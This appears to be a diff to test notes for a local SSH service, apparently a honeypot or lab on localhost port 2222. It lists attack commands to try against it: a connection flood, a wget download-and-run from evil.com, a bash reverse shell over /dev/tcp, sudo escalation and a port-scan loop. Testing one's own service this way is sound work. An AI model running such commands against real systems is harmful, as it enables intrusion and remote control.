@@ -33,19 +33,24 @@ then again : ssh admin@localhost -p 2222
 
 other attacks :
 Connection Flood:
+
 for /L %i in (1,1,10) do start ssh admin@localhost -p 2222
 
 Malicious Command Injection:
+
 ssh admin@localhost -p 2222 "wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh"
 
 Reverse Shell Attempt:
+
 ssh admin@localhost -p 2222 "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
 
 Sudo Privilege Escalation:
+
 ssh admin@localhost -p 2222
-# Then in session: sudo su
+ Then in session: sudo su
 
 Port Scanning:
+
 for /L %i in (1,1,100) do (
   timeout 1 ssh admin@localhost -p %i 2>nul && echo Port %i is open || echo Port %i is closed
 )
